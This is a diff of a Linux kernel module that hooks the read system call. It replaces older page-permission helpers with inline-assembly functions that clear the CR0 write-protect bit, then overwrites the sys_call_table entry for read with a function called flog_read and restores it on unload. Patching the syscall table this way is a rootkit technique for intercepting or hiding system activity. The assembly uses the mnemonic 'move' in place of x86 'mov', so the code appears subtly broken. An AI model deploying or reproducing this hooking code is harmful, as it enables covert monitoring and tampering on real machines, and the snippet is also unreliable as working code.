@@ -45,29 +45,61 @@ asmlinkage size_t flog_read(int filedes, void *buf, size_t bytes)
   return og_sys_read(filedes, buf, bytes);
 }
 
-int set_pg_rw(long unsigned int addr)
-{
-  struct page *pg;
-  pgprot_t prot;
-  pg = virt_to_page(addr);
-  prot.pgprot = VM_READ | VM_WRITE;
-  return change_page_attr(pg, 1, prot);
+/* NOTE: this is depreciated, use alt method for */
+/* disabling page write protection */
+/* int set_pg_rw(long unsigned int addr) */
+/* { */
+/*   struct page *pg; */
+/*   pgprot_t prot; */
+/*   pg = virt_to_page(addr); */
+/*   prot.pgprot = VM_READ | VM_WRITE; */
+/*   return change_page_attr(pg, 1, prot); */
+/* } */
+
+/* int set_pg_ro(long unsigned int addr) */
+/* { */
+/*   struct page *pg; */
+/*   pgprot_t prot; */
+/*   pg = virt_to_page(addr); */
+/*   prot.pgprot = VM_READ; */
+/*   return change_page_attr(pg, 1, prot); */
+/* } */
+
+static void disable_page_protection(void) {
+  unsigned long pgval;
+  asm volatile("move %%cr0, %0" 
+	       :"=r" (pgval));
+  if (pgval & 0x00010000) {
+    pgval &= ~0x00010000;
+    asm volatile("move %0,%%cr0"
+		 : : "r" (pgval));
+  }
 }
 
-int set_pg_ro(long unsigned int addr)
-{
-
+static void enable_page_protection(void) {
+  unsigned long pgval;
+  asm volatile("move %%cr0, %0" 
+	       :"=r" (pgval));
+  if (!(pgval & 0x00010000)) {
+    pgval |= 0x00010000;
+    asm volatile("move %0,%%cr0"
+		 : : "r" (pgval));
+  }
 }
 
 int init_module()
 {
+  disable_page_protection();
   og_sys_read = sys_call_table[__NR_read];
   sys_call_table[__NR_read] = flog_read;
+  enable_page_protection();
   return 0;
 }
 
 void cleanup_module()
 {
-  printk("done flogging!\n");
+  disable_page_protection();
   sys_call_table[__NR_read] = og_sys_read;
+  enable_page_protection();
+  printk("done flogging!\n");
 }
